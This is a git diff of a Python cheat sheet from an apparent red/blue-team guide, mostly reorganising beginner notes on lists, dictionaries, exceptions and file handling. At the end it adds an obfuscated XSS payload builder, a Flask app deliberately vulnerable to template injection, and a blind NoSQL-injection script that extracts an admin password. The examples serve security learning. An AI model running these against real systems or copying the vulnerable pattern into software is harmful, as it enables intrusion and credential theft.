@@ -2,40 +2,16 @@
 1) [BEST PRACTICES](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#best-practices)
 2) [BASICS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#basics)
 3) [DATA STRUCTURES](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#data-structures)
-4) [CONTROL FLOW](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#control-flow)
-5) [FUNCTIONS](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#functions)
-6) [SCRIPTING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#scripting)
-7) [CODE EXAMPLES](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#code-examples)
+4) [SCRIPTING](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#scripting)
+5) [CODE EXAMPLES](https://github.com/p-arrow/Red-Blue-Guide/blob/main/Coding/Python.md#code-examples)
 
 <br />
 
 ## BEST PRACTICES
-
-#### Readability 
-```
-# Good Examples
-
-print((1 + 2 + 4)/13)
-print(4/2 + 7*7)
-```
-
-#### BAD EXAMPLES OF BOOLEAN EXPRESSIONS 
-- Don't use True or False as conditions, e.g. `if True`
-- Be careful writing expressions that use logical operators
-- Don't compare a boolean variable with `== True` or `== False`, e.g. `if is_cold == True`
-
-
 #### Iterables vs. Iterator vs Generator 
 - **iterables** are objects that can return one of their elements at a time (e.g. list)
 - **iterator** is an object that represents a stream of data
 - **Generators** are a simple way to create iterators using functions
-
-
-#### Built-in Objects (considered "False") 
-- Constants defined to be false: `None, False`
-- Zero of any numeric type: `0, 0.0, 0j, Decimal(0), Fraction(0, 1)`
-- Empty sequences and collections: `'"", (), [], {}, set(), range(0)`
-
 
 #### Docstring
 ```
@@ -148,44 +124,6 @@ x-=2 --> x=x-2
 x*=2 --> x=x*2
 x,y,z = 1,2,3 (simultaneous assignment)
 ```
-
-#### Reserved Words 
-```
-false   class    finally  is       return
-none    continue for      lambda   try
-true    def      from     nonlocal while
-and     del      global   not      with
-as      elif     if       or       yield
-assert  else     import   pass
-break   except   in       raise
------
-and 	assert 	break 	class 	continue
-def 	del 	elif 	else 	except
-exec 	finally 	for 	from 	global
-if 	import 	in 	is 	lambda
-not 	or 	pass 	print 	raise
-return 	try 	while 	
-```
-
-#### Interger vs Float
-- Integer: 4, 10100
-- Float: 4.0, 5.383647, 0.5, .1
-
-#### in / not in
-- **Function**: return bool value (false, true)
-```
-Namen = ['kai', 'roy','bernd']
-print('klaus' in Namen) 
-
-#output: false
-```
-
-#### is / not is
-- **identity operator**
-- "is" evaluates if both sides have the same identity
-- "is not" evaluates if both sides have different identities
-
-
 #### == vs is (Equality vs Identity)
 ```
 a = [1, 2, 3]
@@ -210,11 +148,14 @@ a.__sub__(7)    --> 5.5
 s = "Hallo Welt"
 s.__len__()     --> 10
 ```
-
+#### DECLARE ENCODING
+- At top of file.py:
+    - `#!/usr/bin/env python`
+    - `# -*- coding: utf-8 -*-`
+    
 <br />
 
 ## DATA STRUCTURES
-
 #### String Methods
 ```
 a = "meinefiesefresseausderschnauze"
@@ -231,72 +172,37 @@ a = "meinefiesefresseausderschnauze"
     a.replace("m","D")
     len(a) --> 30
 ```
-
-- Reverse String
-   - `string_rev = string[::-1]`:  string[start,stop,step]
-- Split/Strip
-```
-# Open file "filename", extract values (letter and flower) and add it to dictionary flowerdict
-
-def create_flowerdict(filename):
-   flower_dict = {}
-   with open(filename) as f:
-       for line in f:
-           letter = line.split(": ")[0].lower() 
-           flower = line.split(": ")[1].strip()
-           flower_dict[letter] = flower
-   return flower_dict
-```
+- `string_rev = string[::-1]`:  string[start,stop,step]
+- `letter = line.split(": ")[0].lower()`
+- `flower = line.split(": ")[1].strip()`
+    - `flower_dict[letter] = flower`
 
 #### Lists
-- mutable sequence
-- ordered sequence (zero index basing)
-- `[ ]` or list()
-- `List = [1.3,"hallo","3"]`
-- Slicing: return certain range of data (will be a list too)
-    - `list = [1,2,3,4]`
-    - `print(list[1:3])`: [2,3] *lower value included, upper value excluded!
-    - `print(list[-2:])`: [3,4] *slicing works also reversely
-    - `print("Hallo Welt"[-4:])`: "Welt"
-
-
-#### Lists Methods
+- `list = [1,2,3,4]`
+- `print(list[1:3])`: [2,3] *lower value included, upper value excluded!
+- `print(list[-2:])`: [3,4] *slicing works also reversely
+- `print("Hallo Welt"[-4:])`: "Welt"
 - `max(list)`: returns greatest element
 - `min(list)`: returns smallest element
 - `sorted(list, reverse=true)`: 
     - returns sorted list
     - leaves original list unchanged (!)
-- `liste.sort(key="fkt.", reverse=true)`
-    - changes original list (!)
-- join method:
-    - `new_str = "-".join(["fore", "aft"])`: fore-aft
-- append method:
-    - `letters = ['a','b','c']`
-    - `letters.append('z') --> ['a','b','c','z']`
-- format method: 
-    - `maria_string = "Maria loves {} and {}"`
-    - `print(maria_string.format("math","statistics"))`: Maria loves math and statistics
+- `liste.sort(key="fkt.", reverse=true)`: changes original list (!)
+- `new_str = "-".join(["fore", "aft"])`: output -> fore-aft
+- `letters.append('z') --> ['a','b','c','z']`
+- `print("Maria loves {} and {}".format("math","statistics"))`: Maria loves math and statistics
 - `del list[3]`: Delete the 4th element of list
-
-#### List Comprehension
-```
-capitalized_cities = [city.title() for city in cities]
-squares = [x**2 for x in range(9) if x % 2 == 0]
-squares = [x**2 if x % 2 == 0 else x + 3 for x in range(9)]
-```
+- List Comprehension:
+    - `capitalized_cities = [city.title() for city in cities]`
+    - `squares = [x**2 for x in range(9) if x % 2 == 0]`
+    - `squares = [x**2 if x % 2 == 0 else x + 3 for x in range(9)]`
 
 #### Tuples
-- immutable: you can't add, remove, sort items
-- ordered sequence (zero index basing)
-- ( ) or tuple()
+- `tuple_a = 1,2`: parentheses can be omit
+- `tuple_b = (1,2)`
+- `t = 1,2,3` --> `x,y,z = t`: tiple unpacking --> x=1, y=2, z=3 
+- Put Tuples in lists:
 ```
-tuple_a = 1,2    # parentheses can be omit
-tuple_b = (1,2)
-
-t = 1,2,3
-x,y,z = t     # x=1, y=2, z=3  --> "tuple unpacking"   
-
-# Put Tuples in lists
 students = [("Max",23),("Kai",20)]
 for name,age in students:
     print(name)
@@ -304,10 +210,6 @@ for name,age in students:
 ```
 
 #### Sets
-- mutable sequence 
-- unordered (i.e. there is no last element, no index)
-- set have only unique elements (no item twice!, quickly remove duplicates)
-- { } or set()
 ```   
 numbers = [1, 2, 6, 3, 1, 1, 6]
 unique_nums = set(numbers)
@@ -330,11 +232,6 @@ for i in range(0, 50):
 ```
 
 #### Dictionary 
-- mutable data type that stores mappings of unique keys to values
-- unordered: cannot be sorted
-- Dictionary keys must be immutable (!)
-   - Example: string, int, float 
-- { } or dict()
 ```
 elements = {"hydrogen": 1, "helium": 2, "carbon": 6}    # hydrogen = key, 1 = value
 print(elements["helium"])                               # 2 
@@ -345,27 +242,27 @@ print("carbon" in elements)                             # check existing key; "F
 print(elements.get("dilithium"))                        # None (i/o error message)
 print(elements["dilithium"])                            # KeyError
 elements.get("kryptonite", 'There\'s no such element!') # defined return value
-```
 
-```
-# return both key and value
+#return both key and value
+
 for key, value in elements.items():
      print("Key: {}    Value: {}".format(key, value))
-```
--   `print(elements.keys())`
--   `print(elements.values())`
--   `sorted_keys = sorted(elements.keys())`
-```
-# use for-loop and dictionary to count entries in string "book_title"
+
+print(elements.keys())
+print(elements.values())
+sorted_keys = sorted(elements.keys())
+
+#Use for-loop and dictionary to count entries in string "book_title"
+#If word_counter.get does not find "word" in book_title then return 0 (new entry)
+#Otherwise +1 (increase counter)
 
 word_counter = {}
 for word in book_title:
-    word_counter[word] = word_counter.get(word, 0) + 1  # if word_counter.get does not find "word" in book_title then return 0 (new entry). Otherwise +1 (increase counter)
-```
+    word_counter[word] = word_counter.get(word, 0) + 1  
 
-#### Compound Structures
-- include containers in other containers, e.g. dictionary in a dictionary
-```
+#Compound Structures
+#Include containers in other containers, e.g. dictionary in a dictionary
+
 elements = {"hydrogen": {"number": 1,
                          "weight": 1.00794,
                          "symbol": "H"},
@@ -376,60 +273,123 @@ elements["oxygen"] = oxygen  #add oxygen to dictionary
 
 <br />
 
-## CONTROL FLOW
+## SCRIPTING
+#### ERRORS
+- Syntax errors:
+    - Occur when Python can’t interpret our code
+    - These are errors you’re likely to get when you make a typo, or starting to learn Python
+- Exceptions:
+    - Occur when unexpected things happen during execution of a program (even syntactically correct)     
+    - Different types of built-in exceptions available 
+    - **ValueError**
+        - An object of the correct type but inappropriate value 
+    - **AssertionError**
+        - An assert statement fails
+    - **IndexError**
+        - A sequence subscript is out of range
+    - **KeyError**
+        - A key can't be found in a dictionary
+    - **TypeError**
+        - An object of an unsupported type is passed as input to an operation or function.
+    - **ZeroDivisionError**
+    - **FileNotFoundError**
 
-#### if / elif / else
+#### CREATE INDIVIDUAL EXCEPTION
 ```
-if "condition1" and "condition2":
-   "code"
-elif "condition":
-   "code"
-else:
-   "code"
+#Extend class Exception with own error message "InvalidEmailError" via Inheritance
+class InvalidEmailError(Exception):
+    pass
+
+# Example with individual raise-notification
+def send_mail(email, subject, content):
+    if not "@" in email:
+        raise InvalidEmailError("email does not contain an @")
+try:     
+    send_mail("hello", "subject", "content")
+except InvalidEmailError:
+    print("Please enter a valid email address")
 ```
 
-#### For Loop
+#### TRY STATEMENT
+- use try statements to handle exceptions
+- four clauses can be used:
+    - **try**
+        - This is the only mandatory clause in a try statement
+        - The code in this block is the first thing that Python runs in a try statement
+    - **except**
+        - Switch to "except statement" when an exception occurs while running try block
+    - **else:**
+        - If Python runs into no exceptions while running the try block
+        - Then it will run the else block 
+    - **finally**
+        - Before Python leaves try block, it will run the code in finally block under any condition
+        - Even if it's ending the program if Python runs into error while running except or else block
+        - This finally block will still be executed before stopping the program
 ```
-for i in range(3):
-  print("Hello!")
-  
-# print output in one line (w/o newline)
-for list in lists:
-    print(list, end="")
+# Example
+while True: 
+   try:
+    x = int(input('Enter a number:  '))
+      break
+   except ValueError: 
+      print('That\'s not a valid number!')
+   except KeyboardInterrupt:
+      print('\n No input taken')
+      break 
+   finally:
+      print('\n Attempted Input\n')
+
+# while-loop works best when input-prompt is within try block
+# Otherwise continous loop possible (!) 
 ```
 
-#### While Loop 
-- **break** terminates a loop
-- **continue** skips one iteration of a Loop
+#### ACCESSING ERROR MESSAGE
 ```
-card_deck = [4, 11, 8, 5, 13, 2, 8, 10]
-hand = []
-while sum(hand)  < 17:
-    hand.append(card_deck.pop())
+try:
+ #some code
+except ZeroDivisionError as y:
+ #some code
+print("ZeroDivisionError occurred: {}".format(y))
+
+# Output: "ZeroDivisionError occurred: integer division or modulo by zero"
+#If you don't have specific error, you can still access the message like this:
+
+try:
+ #some code
+except Exception as y:
+ #some code
+print("Exception occurred: {}".format(y))
 ```
 
+#### YOUR OWN PROJECT
+```
+# create project file xyz
+# create virtual environment
+python -m venv [source/repos/projects/xyz]
+
+# choose corresponding Interpreter in VS Code
+xyz/scripts/python.exe
+
+# install needed packages
+.projects/xyz pip install [package]
+
+# create requirements.txt
+pip freeze > requirements.txt
+
+# Finally, install all the dependencies listed in this file
+pip install -r requirements.txt
+```
 
 <br />
 
-## FUNCTIONS
-- Function names follow the same naming conventions as variables !
-- We can add default arguments in a function to have default parameters
-- Given parameters will overwrite default parameters
-- If a variable is created inside a function, it can only be used within that function !
-
+## CODE EXAMPLES
+#### For Loop
 ```
-# Examples
+# print output in one line (w/o newline)
 
-def cylinder_volume(height, radius=5):
-   pi = 3.14159
-   return height * pi * radius ** 2
-
-egg_count = 0
-  def buy_eggs():
-    egg_count += 12     # Error: changing the global variable "egg_count"
-  buy_eggs()            # Error will occur
+for list in lists:
+    print(list, end="")
 ```
-
 #### LAMBDA FUNCTION
 - creates quickly anonymous functions (w/o function name)
 - not ideal for complex functions
@@ -463,7 +423,14 @@ def my_range(x):
 - `sq_list = [x**2 for x in range(10)]`:     list of squares
 - `sq_iterator = (x**2 for x in range(10))`: iterator of squares
 
-
+#### GRAPHICS WITH MATPLOT
+```
+import matplotlib.pyplot as plt
+xs = [1, 2, 5]
+ys = [4, 7, 5]
+plt.plot(xs, ys)
+plt.show()
+```
 #### BUILT-IN FUNCTION: range
 - range(start=0, stop, step=1)
     - `range(4)` returns `0, 1, 2, 3`  #stop
@@ -587,97 +554,6 @@ print(result)
 # Output Example: Enter an expression: 67*45 --> output:3015
 ```
 
-<br />
-
-## SCRIPTING
-
-#### ERRORS
-- Syntax errors:
-    - Occur when Python can’t interpret our code
-    - These are errors you’re likely to get when you make a typo, or starting to learn Python
-- Exceptions:
-    - Occur when unexpected things happen during execution of a program (even syntactically correct)     
-    - Different types of built-in exceptions available 
-    - **ValueError**
-        - An object of the correct type but inappropriate value 
-    - **AssertionError**
-        - An assert statement fails
-    - **IndexError**
-        - A sequence subscript is out of range
-    - **KeyError**
-        - A key can't be found in a dictionary
-    - **TypeError**
-        - An object of an unsupported type is passed as input to an operation or function.
-    - **ZeroDivisionError**
-    - **FileNotFoundError**
-
-#### CREATE INDIVIDUAL EXCEPTION
-```
-#Extend class Exception with own error message "InvalidEmailError" via Inheritance
-class InvalidEmailError(Exception):
-    pass
-
-# Example with individual raise-notification
-def send_mail(email, subject, content):
-    if not "@" in email:
-        raise InvalidEmailError("email does not contain an @")
-try:     
-    send_mail("hello", "subject", "content")
-except InvalidEmailError:
-    print("Please enter a valid email address")
-```
-
-#### TRY STATEMENT
-- use try statements to handle exceptions
-- four clauses can be used:
-    - **try**
-        - This is the only mandatory clause in a try statement
-        - The code in this block is the first thing that Python runs in a try statement
-    - **except**
-        - Switch to "except statement" when an exception occurs while running try block
-    - **else:**
-        - If Python runs into no exceptions while running the try block
-        - Then it will run the else block 
-    - **finally**
-        - Before Python leaves try block, it will run the code in finally block under any condition
-        - Even if it's ending the program if Python runs into error while running except or else block
-        - This finally block will still be executed before stopping the program
-```
-# Example
-while True: 
-   try:
-    x = int(input('Enter a number:  '))
-      break
-   except ValueError: 
-      print('That\'s not a valid number!')
-   except KeyboardInterrupt:
-      print('\n No input taken')
-      break 
-   finally:
-      print('\n Attempted Input\n')
-
-# while-loop works best when input-prompt is within try block
-# Otherwise continous loop possible (!) 
-```
-
-#### ACCESSING ERROR MESSAGE
-```
-try:
- #some code
-except ZeroDivisionError as y:
- #some code
-print("ZeroDivisionError occurred: {}".format(y))
-
-# Output: "ZeroDivisionError occurred: integer division or modulo by zero"
-#If you don't have specific error, you can still access the message like this:
-
-try:
- #some code
-except Exception as y:
- #some code
-print("Exception occurred: {}".format(y))
-```
-
 #### READING FILES
 ```
 f = open('my_path/my_file.txt', 'r')
@@ -700,45 +576,8 @@ f = open('my_path/my_file.txt', 'w')
   f.close()
 ```
 
-
-#### YOUR OWN PROJECT
-```
-# create project file xyz
-# create virtual environment
-python -m venv [source/repos/projects/xyz]
-
-# choose corresponding Interpreter in VS Code
-xyz/scripts/python.exe
-
-# install needed packages
-.projects/xyz pip install [package]
-
-# create requirements.txt
-pip freeze > requirements.txt
-
-# Finally, install all the dependencies listed in this file
-pip install -r requirements.txt
-```
-
-#### DECLARE ENCODING
-- At top of file.py:
-    - `#!/usr/bin/env python`
-    - `# -*- coding: utf-8 -*-`
-
-<br />
-
-## CODE EXAMPLES
-
-#### GRAPHICS WITH MATPLOT
-```
-import matplotlib.pyplot as plt
-xs = [1, 2, 5]
-ys = [4, 7, 5]
-plt.plot(xs, ys)
-plt.show()
-```
-
 #### OBJECT ORIENTATION AND INHERITANCE
+```
 #Klasse FileReader besitzt einen Kosntruktor und eine Funktion
 class FileReader():
     #Der Konstruktor legt nur ein Attribut "filename" fest
@@ -759,7 +598,7 @@ class CsvReader(FileReader):
     #Auch die Funktion "lines" wird von FileReader geerbt
     def lines(self):
         lines = super().lines()
-
+```
 
 #### WEB CRAWLER
 ```
@@ -809,8 +648,6 @@ with open('datei.csv', 'w', newline='') as csvfile:
         articlewriter.writerow([article.emoji, article.title, article.image, article.content])
 ```
 
-
-
 #### CALL MODULE FROM OTHER PROJECT FILES
 ```
 # Option A 
@@ -854,7 +691,6 @@ def create_plot(**plot_params):
     plt.show()
 create_plot(color="r", linewidth=10, linestyle="dashed")
 ```
-
 
 #### DATE AND TIME 
 ```
@@ -981,3 +817,81 @@ def xor(str1, str2):
 #### HTTP SERVER
 - py2: `python -m SimpleHTTPServer`
 - py3: `python -m http.server`
+
+#### ESCAPE ALERT (XSS)
+```
+#!/usr/bin/python3
+
+text = "('xss')"
+
+x = [ord(i) for i in "alert"]
+result = str(x).strip("[]")
+
+payload = "<script>eval(String.fromCharCode("+result+"))"+text+"</script>"
+print(payload)
+```
+
+#### FLASK APP (VULNERABLE TO SSTI)
+```
+#!/usr/bin/python3
+
+from flask import Flask, redirect, render_template_string, render_template, request
+
+app = Flask(__name__)
+@app.errorhandler(404)
+def page_not_found(e):
+    #line12: request.url is loaded dynamically into the template
+    #line15: malicious code can be injected and interpreted by the template - SSTI!
+    template = '''
+    {%%block body %%}
+    <div class="center-content error">
+        <h1>Page not Found: %s</h1>
+    </div>
+    {%% endblock %%}
+    ''' % (request.url)
+    return render_template_string(template), 404
+
+@app.route('/')
+def index():
+    return render_template('index.html')
+
+if __name__ == '__main__':
+    app.run(debug=False,host='0.0.0.0')
+```
+
+#### PAYLOAD MONGODB
+```
+#!/usr/bin/python3
+
+import urllib.request
+import string
+
+URL = "http://example.com/"
+
+def check(payload):
+    url = URL+"/?search=admin'%20%26%26%20this.password.match(/^"+payload+"/)%00"
+    #print(url)
+    resp = urllib.request.urlopen(url)
+    data = resp.read()
+    return ">admin<" in str(data)
+
+def createPayload():
+    CHARSET = list(string.ascii_lowercase+string.digits+"-")
+    key = ""
+    while True:
+        for c in CHARSET:
+            test = key + c
+            if check(test):
+                print("[+] payload extended with " + c)
+                key += c
+                break
+            elif c == CHARSET[-1]:
+                print(key)
+                exit(0)
+    return key
+
+createPayload()
+```
+
+
+
